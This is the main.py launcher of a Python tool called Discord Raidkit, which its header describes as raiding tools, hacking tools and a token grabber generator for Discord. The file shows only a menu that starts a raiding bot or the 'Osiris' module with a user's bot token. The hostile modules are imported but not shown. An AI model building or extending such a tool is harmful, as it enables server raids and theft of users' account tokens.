'''
Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
Copyright © 2022 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

main.py runs the program.
main.py was last updated on 11/08/22 at 17:37.
'''

import logging
import os
from asyncio.proactor_events import _ProactorBasePipeTransport

from discord.errors import HTTPException, LoginFailure

from config import DRConfig
from display import change_brightness, show_invalid_token, show_welcome_menu
from programs.osiris import Osiris
from programs.raidkit import Raidkit
from utils import check_update

logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
                    filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')

VERSION = 'v2.3.0'


def silence_event_loop_closed(func):
    def wrapper(self, *args, **kwargs):
        try:
            return func(self, *args, **kwargs)
        except RuntimeError as e:
            if str(e) != 'Event loop is closed':
                raise
    return wrapper


def run_raidkit(raidkit_id: int, token: str, prefix: str, app_id: str, theme: str) -> bool:
    try:
        bot = Raidkit(raidkit_id, prefix, app_id, theme)
        bot.run(token)
    except HTTPException and LoginFailure:
        logging.error(
            f'Error in main.py - run_raidkit(): invalid bot token provided.')
        cfg["token"] = ''
        show_invalid_token(cfg['theme'])
        input('Enter anything to exit >>> ')
        raise SystemExit
    except Exception as e:
        logging.error(f'Error in main.py - run_raidkit(): {e}')
        bot.clear()
        return False
    return True


def run_osiris(theme: str) -> bool:
    try:
        osiris = Osiris(theme)
        osiris.run()
    except Exception as e:
        logging.error(f'Error in main.py - run_osiris(): {e}')
        return False
    return True


def main() -> None:
    _ProactorBasePipeTransport.__del__ = silence_event_loop_closed(
        _ProactorBasePipeTransport.__del__)

    check_update(VERSION)
    input()

    temp = ''
    while temp != '5':
        show_welcome_menu(cfg['theme'])
        temp = input()
        if temp == '1':
            if cfg.set_cfg():
                run_raidkit(1, cfg['token'], cfg['prefix'],
                            cfg['app_id'], cfg['theme'])
        elif temp == '2':
            if cfg.set_cfg():
                run_raidkit(2, cfg['token'], cfg['prefix'],
                            cfg['app_id'], cfg['theme'])
        elif temp == '3':
            run_osiris(cfg['theme'])
        elif temp == '4':
            cfg.config['theme'] = input('Enter the theme name: ').lower()
            cfg.write_config()

    return


if __name__ == '__main__':
    cfg = DRConfig(os.path.join('config', 'config.json'))
    change_brightness('bright')
    main()
    change_brightness()
    exit(0)
